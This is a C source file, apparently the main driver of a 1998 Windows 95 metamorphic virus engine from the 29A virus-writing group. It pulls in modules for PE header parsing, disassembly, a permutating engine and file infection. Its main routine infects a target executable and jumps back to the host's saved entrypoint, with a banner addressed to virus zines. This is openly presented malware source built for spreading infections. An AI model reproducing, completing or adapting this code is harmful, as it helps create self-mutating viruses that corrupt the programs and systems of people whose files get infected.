
// ==========================================================================
//  Advanced ZCME/32Bit [Win95]  [COMPONENT]  Copyright (c) 1998 Z0MBiE/29A
//  For great help in creation of this project thanx to Lord Asd
//  Permutating(Metamorphic) Engine Research                   <z0mbie@i.am>
//  NOT FOR [RE]PUBLISHING/DISASM IN VX-ZINES, EXCEPT 29A      <i.am/z0mbie>
// ==========================================================================

// last updated: 24-07-98 02:11:07

unsigned long save_entrypoint = 0xFFFFFFFF;   // saved program`s entrypoint

#include "system.c"     // system routines
#include "params.h"     // global parameters/constants
#include "mz.h"         // mz header structure
#include "pe.h"         // pe header/object table structure
#include "string.c"     // asciiz strings manipulations
#include "fileio.c"     // file io
#include "crt.c"        // screen io routines, such as printf
#include "arg.c"        // command line management
#include "random.c"     // random number generator, using io-port
#include "disasm.c"     // command disassembler
#include "engine.c"     // permutating engine
#include "infect.c"     // file infection routines

void main(void)
  {
    dword t;

    con_init();         // initialize console
    arg_init();         // parse command line

    if (cmp(&argv[1], "RUN_FILE",9))     // if 1st parameter is "RUN_FILE"
      {
        asm                              // then execute old program,
            mov     eax, save_entrypoint // but check for 1st execution
            inc     eax                  // when entrypoint not initialized
            jz      __1
            dec     eax
            jmp     eax
    __1:
        end;
        printf("This is FIRST execution, RUN_FILE not availablle");
        exit(1);
      }

    if (argc != 3)     // otherwise, check for valid number of parameters
      {
        printf("Syntax:  %a  <source_file>  <dest_file>\n", argv[0]);
        printf("     or\n");
        printf("         %a  RUN_FILE\n", argv[0]);

        exit(1);
      }

    t = time();        // calculate time used by infection & engine

    run_infect(argv[1], argv[0], argv[2]);  // process infection

    t = time() - t;

    printf("%d milliseconds\n", t );

    con_done();       // close console
    exit(0);          // exit
  }

